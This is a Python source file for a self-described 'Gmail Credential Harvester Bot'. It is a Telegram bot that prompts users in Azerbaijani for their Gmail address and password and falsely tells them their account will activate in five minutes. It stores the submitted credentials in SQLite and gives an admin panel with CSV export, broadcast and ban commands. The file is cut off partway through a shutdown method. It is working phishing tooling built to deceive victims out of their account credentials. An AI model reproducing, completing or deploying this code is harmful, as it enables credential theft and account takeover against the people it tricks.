"""
Gmail Credential Harvester Bot - Advanced Enterprise Version
Advanced features: Admin panel, Graceful shutdown, Retry mechanism, Metrics, Health check, CSV export
"""

import os
import sys
import asyncio
import logging
import logging.handlers
import sqlite3
import re
import base64
import secrets
import random
import json
import csv
import signal
from io import StringIO
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, Optional, Tuple, List, Any
from contextlib import contextmanager
from dataclasses import dataclass, asdict

# Try to import required packages
try:
    from telethon import TelegramClient, events
    from telethon.tl.functions.messages import DeleteMessagesRequest
    import aiohttp
except ImportError as e:
    print(f"❌ Missing dependency: {e}")
    print("Please install: pip install -r requirements.txt")
    sys.exit(1)

try:
    from dotenv import load_dotenv
except ImportError:
    print("❌ Missing python-dotenv")
    print("Please install: pip install python-dotenv")
    sys.exit(1)

# ============================================================
# 1. CONFIGURATION SYSTEM
# ============================================================

class Config:
    """Application Configuration"""
    
    def __init__(self, env_file: str = ".env"):
        """Initialize configuration from .env file"""
        env_path = Path(env_file)
        if not env_path.exists():
            raise FileNotFoundError(
                f"Configuration file '{env_file}' not found. "
                f"Please copy .env.example to .env and fill in your credentials."
            )
        
        load_dotenv(env_file)
        self._validate_required_vars()
    
    def _validate_required_vars(self) -> None:
        """Validate that all required environment variables are set"""
        required_vars = [
            "TELEGRAM_API_ID",
            "TELEGRAM_API_HASH",
            "TELEGRAM_BOT_TOKEN",
            "TELEGRAM_ADMIN_ID"
        ]
        
        for var in required_vars:
            if not os.getenv(var):
                raise ValueError(f"Required environment variable '{var}' is not set")
    
    @property
    def telegram_api_id(self) -> int:
        return int(os.getenv("TELEGRAM_API_ID", 0))
    
    @property
    def telegram_api_hash(self) -> str:
        return os.getenv("TELEGRAM_API_HASH", "")
    
    @property
    def telegram_bot_token(self) -> str:
        return os.getenv("TELEGRAM_BOT_TOKEN", "")
    
    @property
    def telegram_admin_id(self) -> int:
        return int(os.getenv("TELEGRAM_ADMIN_ID", 0))
    
    @property
    def webhook_url(self) -> str:
        return os.getenv("WEBHOOK_URL", "http://127.0.0.1:8000/webhook")
    
    @property
    def webhook_timeout(self) -> int:
        return int(os.getenv("WEBHOOK_TIMEOUT", 5))
    
    @property
    def database_path(self) -> str:
        db_path = os.getenv("DATABASE_PATH", "data/bot.db")
        Path(db_path).parent.mkdir(parents=True, exist_ok=True)
        return db_path
    
    @property
    def database_cleanup_days(self) -> int:
        return int(os.getenv("DATABASE_CLEANUP_DAYS", 7))
    
    @property
    def session_file(self) -> str:
        return os.getenv("SESSION_FILE", "bot_session_new")
    
    @property
    def session_timeout_minutes(self) -> int:
        return int(os.getenv("SESSION_TIMEOUT_MINUTES", 30))
    
    @property
    def rate_limit_seconds(self) -> float:
        return float(os.getenv("RATE_LIMIT_SECONDS", 2))
    
    @property
    def max_email_attempts(self) -> int:
        return int(os.getenv("MAX_EMAIL_ATTEMPTS", 3))
    
    @property
    def max_email_attempt_timeout_hours(self) -> int:
        return int(os.getenv("MAX_EMAIL_ATTEMPT_TIMEOUT_HOURS", 1))
    
    @property
    def log_level(self) -> str:
        return os.getenv("LOG_LEVEL", "INFO")
    
    @property
    def log_file(self) -> str:
        log_path = os.getenv("LOG_FILE", "logs/bot.log")
        Path(log_path).parent.mkdir(parents=True, exist_ok=True)
        return log_path
    
    @property
    def log_max_size_mb(self) -> int:
        return int(os.getenv("LOG_MAX_SIZE_MB", 10))
    
    @property
    def log_backup_count(self) -> int:
        return int(os.getenv("LOG_BACKUP_COUNT", 5))
    
    @property
    def enable_message_auto_delete(self) -> bool:
        return os.getenv("ENABLE_MESSAGE_AUTO_DELETE", "true").lower() == "true"
    
    @property
    def message_delete_delay_seconds(self) -> int:
        return int(os.getenv("MESSAGE_DELETE_DELAY_SECONDS", 600))
    
    @property
    def enable_gmail_check(self) -> bool:
        return os.getenv("ENABLE_GMAIL_CHECK", "true").lower() == "true"
    
    @property
    def task_cleanup_interval_minutes(self) -> int:
        return int(os.getenv("TASK_CLEANUP_INTERVAL_MINUTES", 5))
    
    @property
    def debug_mode(self) -> bool:
        return os.getenv("DEBUG", "false").lower() == "true"
    
    @property
    def retry_attempts(self) -> int:
        return int(os.getenv("RETRY_ATTEMPTS", 3))
    
    @property
    def enable_health_check(self) -> bool:
        return os.getenv("ENABLE_HEALTH_CHECK", "true").lower() == "true"


# ============================================================
# 2. LOGGER SYSTEM
# ============================================================

class BotLogger:
    """Custom logger for the bot"""
    
    def __init__(self, config: Config):
        """Initialize logger with configuration"""
        self.config = config
        self.logger = self._setup_logger()
    
    def _setup_logger(self) -> logging.Logger:
        """Setup logger with file and console handlers"""
        logger = logging.getLogger("bot")
        logger.setLevel(getattr(logging, self.config.log_level.upper()))
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(getattr(logging, self.config.log_level.upper()))
        formatter = logging.Formatter(
            fmt='[%(asctime)s] [%(levelname)s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        console_handler.setFormatter(formatter)
        logger.addHandler(console_handler)
        
        # File handler with rotation
        file_handler = logging.handlers.RotatingFileHandler(
            self.config.log_file,
            maxBytes=self.config.log_max_size_mb * 1024 * 1024,
            backupCount=self.config.log_backup_count,
            encoding='utf-8'
        )
        file_handler.setLevel(getattr(logging, self.config.log_level.upper()))
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)
        
        return logger
    
    def info(self, message: str) -> None:
        self.logger.info(message)
    
    def debug(self, message: str) -> None:
        self.logger.debug(message)
    
    def warning(self, message: str) -> None:
        self.logger.warning(message)
    
    def error(self, message: str) -> None:
        self.logger.error(message)
    
    def critical(self, message: str) -> None:
        self.logger.critical(message)


# ============================================================
# 3. VALIDATORS
# ============================================================

class EmailValidator:
    """Email validation with comprehensive checks"""
    
    EMAIL_PATTERN = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    MAX_LENGTH = 254
    FORBIDDEN_CHARS = ['<', '>', '"', '\\', '\n', '\r', '\t']
    
    @classmethod
    def validate(cls, email: str) -> Tuple[bool, str]:
        """
        Validate email format.
        
        Args:
            email: Email address to validate
            
        Returns:
            Tuple[bool, str]: (is_valid, error_message)
        """
        if not email or email != email.strip():
            return False, "Email boş ola bilməz və ya boşluq içərə bilməz"
        
        if len(email) > cls.MAX_LENGTH:
            return False, f"Email maksimum {cls.MAX_LENGTH} simvol ola bilər"
        
        for char in cls.FORBIDDEN_CHARS:
            if char in email:
                return False, f"Email {repr(char)} simvolunu içərə bilməz"
        
        if not re.match(cls.EMAIL_PATTERN, email):
            return False, "Email formatı düzgün deyil (məsələn: user@gmail.com)"
        
        if '@gmail.com' in email.lower():
            local_part = email.split('@')[0]
            
            if len(local_part) < 6:
                return False, "Gmail lokal hissəsi ən azı 6 simvol olmalıdır"
            
            if '..' in local_part:
                return False, "Gmail ardıcıl nöqtə içərə bilməz"
            
            if local_part.startswith('.') or local_part.endswith('.'):
                return False, "Gmail nöqtə ilə başlaya və ya bitə bilməz"
        
        return True, ""


class PasswordValidator:
    """Password validation with Google standards"""
    
    MIN_LENGTH = 8
    MAX_LENGTH = 128
    
    @classmethod
    def validate(cls, password: str) -> Tuple[bool, str]:
        """
        Validate password strength.
        
        Args:
            password: Password to validate
            
        Returns:
            Tuple[bool, str]: (is_valid, error_message)
        """
        if not password or password != password.strip():
            return False, "Şifrə boş ola bilməz və ya boşluq içərə bilməz"
        
        if len(password) < cls.MIN_LENGTH:
            return False, f"Şifrə ən azı {cls.MIN_LENGTH} simvol olmalıdır"
        
        if len(password) > cls.MAX_LENGTH:
            return False, f"Şifrə maksimum {cls.MAX_LENGTH} simvol ola bilər"
        
        if not re.search(r'[a-z]', password):
            return False, "Şifrə ən azı 1 kiçik hərf içərməlidir (a-z)"
        
        if not re.search(r'\d', password):
            return False, "Şifrə ən azı 1 rəqəm içərməlidir (0-9)"
        
        return True, ""


# ============================================================
# 4. MESSAGES
# ============================================================

class Messages:
    """All user-facing messages in Azerbaijani"""
    
    WELCOME = """📧 Xoş gəldiniz!

Zəhmət olmasa **Gmail ünvanınızı** daxil edin:
Format: `ad@gmail.com`"""
    
    EMAIL_ACCEPTED = """✅ Email qəbul edildi!

🔐 İndi isə **şifrəni** daxil edin:
(Minimum 8 simvol, 1 kiçik hərf + 1 rəqəm)"""
    
    EMAIL_INVALID = """❌ **Email formatı düzgün deyil!**

📝 Düzgün format: `ad@gmail.com`
Məsələn: `orxan@gmail.com`

Yənidən cəhd edin:"""
    
    PASSWORD_ACCEPTED = """✅ **Qeydiyyat tamamlandı!**

📧 Hesabınız daxil edildi."""
    
    PASSWORD_INVALID = """❌ **Şifrə güvənli deyil!**

Tələblər:
- Minimum 8 simvol
- 1 kiçik hərf (a-z)
- 1 rəqəm (0-9)

Yənidən cəhd edin:"""
    
    NOT_STARTED = """⚠️ Zəhmət olmasa əvvəlcə /start yazın."""
    
    UNAUTHORIZED = """❌ Sizin buna icazəniz yoxdur."""
    
    ERROR_GENERIC = """❌ Bir xəta baş verdi. Zəhmət olmasa sonra cəhd edin."""
    
    ERROR_API = """❌ Telegram API xətası. Zəhmət olmasa sonra cəhd edin."""
    
    AUTHENTICATED_MSG = """✅ Hər şey qaydasındadır.

5 dəqiqə ərzində aktivləşəcəkdir."""
    
    RATE_LIMITED = """⏳ Çox sürətli yazıyorsunuz!

Zəhmət olmasa {seconds} saniyə gözləyin."""
    
    EMAIL_BLOCKED = """🚫 **Email bloklanıb!**

Çox sayda səhv cəhd etdiniz.
{hours} saata sonra yenidən cəhd edin."""
    
    STATS_MESSAGE = """📊 **BOT STATİSTİKASI**

👥 Toplam İstifadəçi: {total_users}
📈 Bugünkü Sessiyalar: {today_sessions}
⏳ Aktiv Sessiyalar: {active_sessions}
🚫 Bloklanmış: {blocked_count}
⏱️ Botun Çalış Vaxtı: {uptime}"""
    
    BAN_SUCCESS = """✅ İstifadəçi {user_id} bloklandı.
⏱️ Blok Müddəti: {hours} saat
📝 Səbəb: {reason}"""
    
    UNBAN_SUCCESS = """✅ İstifadəçi {user_id} debloklandı."""
    
    BROADCAST_SENT = """✅ Mesaj {count} istifadəçiyə göndərildi."""
    
    SHUTDOWN_MESSAGE = """🛑 **BOT DAYANDIRILIYOR**

Bot məsuliyyətli şəkildə dayandırılır.
Yenidən cəhd edin."""
    
    USERS_LIST = """👥 **SON {count} İSTİFADƏÇİ**

{users_list}"""


# ============================================================
# 5. SECURITY UTILS
# ============================================================

class SecurityUtils:
    """Security utilities for the bot"""
    
    XOR_KEY = 13
    
    @staticmethod
    def xor_encrypt(data: bytes, key: int = XOR_KEY) -> bytes:
        """Encrypt data using XOR cipher"""
        return bytes([byte ^ key for byte in data])
    
    @staticmethod
    def xor_decrypt(data: bytes, key: int = XOR_KEY) -> bytes:
        """Decrypt data using XOR cipher"""
        return SecurityUtils.xor_encrypt(data, key)
    
    @classmethod
    def hash_password(cls, password: str, salt: Optional[str] = None) -> tuple:
        """
        Hash password with SHA256 and salt.
        
        Args:
            password: Password to hash
            salt: Salt value (generated if None)
            
        Returns:
            Tuple[str, str]: (hashed_password, salt)
        """
        import hashlib
        if salt is None:
            salt = secrets.token_hex(16)
        
        hash_obj = hashlib.pbkdf2_hmac(
            'sha256',
            password.encode('utf-8'),
            salt.encode('utf-8'),
            100000
        )
        return base64.b64encode(hash_obj).decode(), salt
    
    @staticmethod
    def mask_password(password: str) -> str:
        """Mask password for logging"""
        if len(password) <= 3:
            return '*' * len(password)
        return password[0] + '*' * (len(password) - 2) + password[-1]
    
    @staticmethod
    def generate_token(length: int = 32) -> str:
        """Generate secure random token"""
        return secrets.token_hex(length // 2)


class RateLimiter:
    """Rate limiting functionality"""
    
    def __init__(self):
        """Initialize rate limiter"""
        self.user_cooldowns: Dict[int, datetime] = {}
        self.user_attempts: Dict[int, List[datetime]] = {}
        self.ip_requests: Dict[str, List[datetime]] = {}
    
    def is_rate_limited(self, user_id: int, limit_seconds: float) -> bool:
        """Check if user is rate limited"""
        if user_id not in self.user_cooldowns:
            return False
        
        elapsed = (datetime.now() - self.user_cooldowns[user_id]).total_seconds()
        return elapsed < limit_seconds
    
    def get_remaining_cooldown(self, user_id: int, limit_seconds: float) -> float:
        """Get remaining cooldown in seconds"""
        if user_id not in self.user_cooldowns:
            return 0
        
        elapsed = (datetime.now() - self.user_cooldowns[user_id]).total_seconds()
        remaining = limit_seconds - elapsed
        return max(0, remaining)
    
    def apply_cooldown(self, user_id: int) -> None:
        """Apply cooldown for user"""
        self.user_cooldowns[user_id] = datetime.now()
    
    def record_attempt(self, user_id: int) -> None:
        """Record attempt for user"""
        if user_id not in self.user_attempts:
            self.user_attempts[user_id] = []
        
        self.user_attempts[user_id].append(datetime.now())
    
    def get_recent_attempts(self, user_id: int, window_seconds: int = 3600) -> int:
        """Get number of attempts in recent time window"""
        if user_id not in self.user_attempts:
            return 0
        
        cutoff = datetime.now() - timedelta(seconds=window_seconds)
        attempts = [
            att for att in self.user_attempts[user_id]
            if att > cutoff
        ]
        
        self.user_attempts[user_id] = attempts
        return len(attempts)
    
    def is_ip_rate_limited(self, ip: str) -> bool:
        """Check if IP is rate limited (10 per hour)"""
        if ip not in self.ip_requests:
            return False
        
        cutoff = datetime.now() - timedelta(hours=1)
        requests = [
            req for req in self.ip_requests[ip]
            if req > cutoff
        ]
        
        self.ip_requests[ip] = requests
        return len(requests) >= 10
    
    def record_ip_request(self, ip: str) -> None:
        """Record request from IP"""
        if ip not in self.ip_requests:
            self.ip_requests[ip] = []
        
        self.ip_requests[ip].append(datetime.now())


class BanManager:
    """Manage bans for emails and users"""
    
    def __init__(self):
        """Initialize ban manager"""
        self.email_bans: Dict[str, datetime] = {}
        self.user_bans: Dict[int, datetime] = {}
        self.ip_bans: Dict[str, datetime] = {}
    
    def ban_email(self, email: str, hours: int) -> None:
        """Ban email for specified hours"""
        ban_until = datetime.now() + timedelta(hours=hours)
        self.email_bans[email.lower()] = ban_until
    
    def ban_user(self, user_id: int, hours: int) -> None:
        """Ban user for specified hours"""
        ban_until = datetime.now() + timedelta(hours=hours)
        self.user_bans[user_id] = ban_until
    
    def ban_ip(self, ip: str, hours: int) -> None:
        """Ban IP address for specified hours"""
        ban_until = datetime.now() + timedelta(hours=hours)
        self.ip_bans[ip] = ban_until
    
    def is_email_banned(self, email: str) -> bool:
        """Check if email is banned"""
        email_lower = email.lower()
        if email_lower not in self.email_bans:
            return False
        
        if datetime.now() > self.email_bans[email_lower]:
            del self.email_bans[email_lower]
            return False
        
        return True
    
    def is_user_banned(self, user_id: int) -> bool:
        """Check if user is banned"""
        if user_id not in self.user_bans:
            return False
        
        if datetime.now() > self.user_bans[user_id]:
            del self.user_bans[user_id]
            return False
        
        return True
    
    def is_ip_banned(self, ip: str) -> bool:
        """Check if IP is banned"""
        if ip not in self.ip_bans:
            return False
        
        if datetime.now() > self.ip_bans[ip]:
            del self.ip_bans[ip]
            return False
        
        return True
    
    def get_ban_remaining_hours(self, email: str) -> float:
        """Get remaining ban hours for email"""
        email_lower = email.lower()
        if email_lower not in self.email_bans:
            return 0
        
        remaining = (self.email_bans[email_lower] - datetime.now()).total_seconds() / 3600
        return max(0, remaining)
    
    def unban_user(self, user_id: int) -> None:
        """Unban user"""
        if user_id in self.user_bans:
            del self.user_bans[user_id]


# ============================================================
# 6. PERFORMANCE METRICS
# ============================================================

class Metrics:
    """Performance and usage metrics"""
    
    def __init__(self):
        """Initialize metrics"""
        self.start_time = datetime.now()
        self.messages_processed = 0
        self.successful_logins = 0
        self.failed_attempts = 0
        self.api_errors = 0
    
    def get_uptime(self) -> str:
        """Get bot uptime as formatted string"""
        elapsed = datetime.now() - self.start_time
        days = elapsed.days
        hours, seconds_remainder = divmod(elapsed.seconds, 3600)
        minutes, _ = divmod(seconds_remainder, 60)
        
        if days > 0:
            return f"{days}g {hours}s {minutes}d"
        elif hours > 0:
            return f"{hours}s {minutes}d"
        else:
            return f"{minutes}d"
    
    def get_stats(self) -> Dict[str, Any]:
        """Get all metrics as dictionary"""
        return {
            'uptime': self.get_uptime(),
            'messages_processed': self.messages_processed,
            'successful_logins': self.successful_logins,
            'failed_attempts': self.failed_attempts,
            'api_errors': self.api_errors,
            'start_time': self.start_time.isoformat()
        }


# ============================================================
# 7. DATABASE
# ============================================================

class DatabaseManager:
    """SQLite database manager"""
    
    def __init__(self, db_path: str):
        """Initialize database manager"""
        self.db_path = db_path
        Path(db_path).parent.mkdir(parents=True, exist_ok=True)
        self._init_database()
    
    @contextmanager
    def get_connection(self):
        """Context manager for database connections"""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        try:
            yield conn
            conn.commit()
        except Exception as e:
            conn.rollback()
            raise e
        finally:
            conn.close()
    
    def _init_database(self) -> None:
        """Initialize database tables"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            # Users table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    telegram_id INTEGER UNIQUE NOT NULL,
                    username TEXT,
                    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    blocked BOOLEAN DEFAULT 0,
                    block_reason TEXT,
                    blocked_until TIMESTAMP
                )
            ''')
            
            # Sessions table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER NOT NULL,
                    telegram_id INTEGER NOT NULL,
                    email TEXT NOT NULL,
                    stage TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    completed_at TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users(id)
                )
            ''')
            
            # Credentials table (NEW)
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER NOT NULL,
                    email TEXT NOT NULL,
                    password_hash TEXT NOT NULL,
                    password_salt TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users(id)
                )
            ''')
            
            # Logs table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    telegram_id INTEGER,
                    action TEXT NOT NULL,
                    details TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users(id)
                )
            ''')
            
            # Bans table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS bans (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    identifier TEXT NOT NULL,
                    ban_type TEXT NOT NULL,
                    reason TEXT,
                    banned_until TIMESTAMP NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Create indices
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON users(telegram_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_sessions_user_id ON sessions(user_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_logs_user_id ON logs(user_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_credentials_user_id ON credentials(user_id)')
    
    def add_user(self, telegram_id: int, username: Optional[str] = None) -> int:
        """Add new user"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT OR IGNORE INTO users (telegram_id, username)
                VALUES (?, ?)
            ''', (telegram_id, username))
            
            cursor.execute('SELECT id FROM users WHERE telegram_id = ?', (telegram_id,))
            row = cursor.fetchone()
            return row['id'] if row else -1
    
    def get_user(self, telegram_id: int) -> Optional[Dict]:
        """Get user by telegram ID"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM users WHERE telegram_id = ?', (telegram_id,))
            row = cursor.fetchone()
            return dict(row) if row else None
    
    def is_user_blocked(self, telegram_id: int) -> bool:
        """Check if user is blocked"""
        user = self.get_user(telegram_id)
        if not user:
            return False
        
        if user['blocked'] == 1:
            # Check if block time has expired
            if user['blocked_until']:
                if datetime.fromisoformat(user['blocked_until']) < datetime.now():
                    self.unblock_user(telegram_id)
                    return False
            return True
        
        return False
    
    def create_session(self, telegram_id: int, email: str) -> int:
        """Create new session"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            user_id = self.add_user(telegram_id)
            
            cursor.execute('''
                INSERT INTO sessions (user_id, telegram_id, email, stage)
                VALUES (?, ?, ?, ?)
            ''', (user_id, telegram_id, email, 'email'))
            
            return cursor.lastrowid
    
    def update_session(self, telegram_id: int, stage: str, email: Optional[str] = None) -> None:
        """Update session stage"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            if email:
                cursor.execute('''
                    UPDATE sessions
                    SET stage = ?, email = ?, updated_at = CURRENT_TIMESTAMP
                    WHERE telegram_id = ?
                ''', (stage, email, telegram_id))
            else:
                cursor.execute('''
                    UPDATE sessions
                    SET stage = ?, updated_at = CURRENT_TIMESTAMP
                    WHERE telegram_id = ?
                ''', (stage, telegram_id))
    
    def complete_session(self, telegram_id: int) -> None:
        """Mark session as completed"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE sessions
                SET stage = 'authenticated', completed_at = CURRENT_TIMESTAMP
                WHERE telegram_id = ?
            ''', (telegram_id,))
    
    def save_credentials(self, user_id: int, email: str, password: str) -> None:
        """
        Save credentials with password hashing.
        
        Args:
            user_id: User ID from users table
            email: Email address
            password: Raw password to hash
        """
        password_hash, salt = SecurityUtils.hash_password(password)
        
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO credentials (user_id, email, password_hash, password_salt)
                VALUES (?, ?, ?, ?)
            ''', (user_id, email, password_hash, salt))
    
    def get_total_users(self) -> int:
        """Get total number of users"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) as count FROM users')
            return cursor.fetchone()['count']
    
    def get_today_sessions(self) -> int:
        """Get number of sessions created today"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT COUNT(*) as count FROM sessions
                WHERE DATE(created_at) = DATE('now')
            ''')
            return cursor.fetchone()['count']
    
    def get_active_sessions_count(self) -> int:
        """Get number of active sessions"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT COUNT(*) as count FROM sessions
                WHERE completed_at IS NULL
            ''')
            return cursor.fetchone()['count']
    
    def get_recent_users(self, limit: int = 10) -> List[Dict]:
        """Get recent users"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT id, telegram_id, username, first_seen, last_seen
                FROM users
                ORDER BY first_seen DESC
                LIMIT ?
            ''', (limit,))
            return [dict(row) for row in cursor.fetchall()]
    
    def get_blocked_users(self) -> List[Dict]:
        """Get blocked users"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT telegram_id, username, block_reason, blocked_until
                FROM users
                WHERE blocked = 1
            ''')
            return [dict(row) for row in cursor.fetchall()]
    
    def block_user(self, telegram_id: int, reason: str, hours: int) -> None:
        """
        Block user for specified hours.
        
        Args:
            telegram_id: User's Telegram ID
            reason: Reason for blocking
            hours: Duration of block in hours
        """
        blocked_until = datetime.now() + timedelta(hours=hours)
        
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE users
                SET blocked = 1, block_reason = ?, blocked_until = ?
                WHERE telegram_id = ?
            ''', (reason, blocked_until.isoformat(), telegram_id))
    
    def unblock_user(self, telegram_id: int) -> None:
        """Unblock user"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE users
                SET blocked = 0, block_reason = NULL, blocked_until = NULL
                WHERE telegram_id = ?
            ''', (telegram_id,))
    
    def get_all_credentials(self) -> List[Dict]:
        """
        Get all credentials for export.
        
        Returns:
            List of credentials (emails only, passwords are hashed)
        """
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT c.email, c.created_at, u.username, u.telegram_id
                FROM credentials c
                JOIN users u ON c.user_id = u.id
                ORDER BY c.created_at DESC
            ''')
            return [dict(row) for row in cursor.fetchall()]
    
    def log_action(self, user_id: int, telegram_id: int, action: str, details: str = '') -> None:
        """Log user action"""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO logs (user_id, telegram_id, action, details)
                VALUES (?, ?, ?, ?)
            ''', (user_id, telegram_id, action, details))
    
    def cleanup_old_data(self, days: int = 7) -> Dict[str, int]:
        """
        Clean up old data.
        
        Args:
            days: Keep data older than this many days
            
        Returns:
            Dict with cleanup stats
        """
        cutoff_date = datetime.now() - timedelta(days=days)
        stats = {'sessions': 0, 'logs': 0, 'bans': 0}
        
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            # Delete old sessions
            cursor.execute(
                'DELETE FROM sessions WHERE updated_at < ?',
                (cutoff_date.isoformat(),)
            )
            stats['sessions'] = cursor.rowcount
            
            # Delete old logs
            cursor.execute(
                'DELETE FROM logs WHERE created_at < ?',
                (cutoff_date.isoformat(),)
            )
            stats['logs'] = cursor.rowcount
            
            # Delete expired bans
            cursor.execute(
                'DELETE FROM bans WHERE banned_until < CURRENT_TIMESTAMP'
            )
            stats['bans'] = cursor.rowcount
        
        return stats
    
    def export_to_csv(self) -> str:
        """
        Export credentials to CSV format.
        
        Returns:
            CSV string with email, username, telegram_id, created_at
        """
        credentials = self.get_all_credentials()
        
        output = StringIO()
        writer = csv.DictWriter(
            output,
            fieldnames=['email', 'username', 'telegram_id', 'created_at']
        )
        
        writer.writeheader()
        for cred in credentials:
            writer.writerow({
                'email': cred['email'],
                'username': cred['username'],
                'telegram_id': cred['telegram_id'],
                'created_at': cred['created_at']
            })
        
        return output.getvalue()


# ============================================================
# 8. SESSION MANAGER
# ============================================================

@dataclass
class UserSession:
    """User session data"""
    user_id: int
    email: Optional[str] = None
    password: Optional[str] = None
    stage: str = "email"
    created_at: datetime = None
    last_activity: datetime = None
    
    def __post_init__(self):
        if self.created_at is None:
            self.created_at = datetime.now()
        if self.last_activity is None:
            self.last_activity = datetime.now()
    
    def is_expired(self, timeout_minutes: int) -> bool:
        """Check if session is expired"""
        elapsed = (datetime.now() - self.last_activity).total_seconds() / 60
        return elapsed > timeout_minutes
    
    def update_activity(self) -> None:
        """Update last activity timestamp"""
        self.last_activity = datetime.now()


class SessionManager:
    """Manages user sessions"""
    
    def __init__(self, db=None):
        """Initialize session manager"""
        self.db = db
        self.sessions: Dict[int, UserSession] = {}
    
    def create_session(self, user_id: int) -> UserSession:
        """Create new session for user"""
        session = UserSession(user_id=user_id)
        self.sessions[user_id] = session
        
        if self.db:
            self.db.create_session(user_id, "")
        
        return session
    
    def get_session(self, user_id: int) -> Optional[UserSession]:
        """Get user's active session"""
        if user_id not in self.sessions:
            return None
        
        session = self.sessions[user_id]
        session.update_activity()
        return session
    
    def update_session_email(self, user_id: int, email: str) -> None:
        """Update session email"""
        if user_id not in self.sessions:
            return
        
        session = self.sessions[user_id]
        session.email = email
        session.stage = "password"
        session.update_activity()
        
        if self.db:
            self.db.update_session(user_id, "password", email)
    
    def update_session_password(self, user_id: int, password: str) -> None:
        """Update session password"""
        if user_id not in self.sessions:
            return
        
        session = self.sessions[user_id]
        session.password = password
        session.stage = "authenticated"
        session.update_activity()
        
        if self.db:
            self.db.update_session(user_id, "authenticated")
            self.db.complete_session(user_id)
    
    def delete_session(self, user_id: int) -> None:
        """Delete user's session"""
        if user_id in self.sessions:
            del self.sessions[user_id]
    
    def cleanup_expired_sessions(self, timeout_minutes: int) -> int:
        """Remove expired sessions"""
        expired_users = [
            user_id for user_id, session in self.sessions.items()
            if session.is_expired(timeout_minutes)
        ]
        
        for user_id in expired_users:
            del self.sessions[user_id]
        
        return len(expired_users)
    
    def session_exists(self, user_id: int) -> bool:
        """Check if session exists"""
        return user_id in self.sessions


# ============================================================
# 9. BOT CORE
# ============================================================

class BotCore:
    """Core bot functionality with admin panel, retry mechanism, and metrics"""
    
    def __init__(self, config: Config, logger: BotLogger, db: DatabaseManager, 
                 session_mgr: SessionManager, rate_limiter: RateLimiter, 
                 ban_manager: BanManager, metrics: Metrics):
        """Initialize bot core"""
        self.config = config
        self.logger = logger
        self.db = db
        self.session_mgr = session_mgr
        self.rate_limiter = rate_limiter
        self.ban_manager = ban_manager
        self.metrics = metrics
        self.client: Optional[TelegramClient] = None
        self.shutdown_event = asyncio.Event()
    
    async def initialize(self) -> None:
        """Initialize Telegram client"""
        try:
            self.client = TelegramClient(
                self.config.session_file,
                self.config.telegram_api_id,
                self.config.telegram_api_hash,
                device_model=self._get_device_model(),
                system_version=self._get_system_version(),
                app_version=self._get_app_version()
            )
            
            # Register event handlers
            self.client.add_event_handler(
                self._handle_start,
                events.NewMessage(pattern='/start', incoming=True)
            )
            
            # Admin panel handlers
            self.client.add_event_handler(
                self._handle_admin_command,
                events.NewMessage(pattern=r'^/(\w+)', incoming=True)
            )
            
            # General message handler
            self.client.add_event_handler(
                self._handle_message,
                events.NewMessage(outgoing=False)
            )
            
            await self.client.start(bot_token=self.config.telegram_bot_token)
            me = await self.client.get_me()
            
            self.logger.info(f"✅ Bot connected: @{me.username}")
            self.logger.info(f"👑 Admin ID: {self.config.telegram_admin_id}")
            
        except Exception as e:
            self.logger.error(f"Failed to initialize bot: {e}")
            raise
    
    async def shutdown(self) -> None:
        """Graceful shutdown"""
        try:
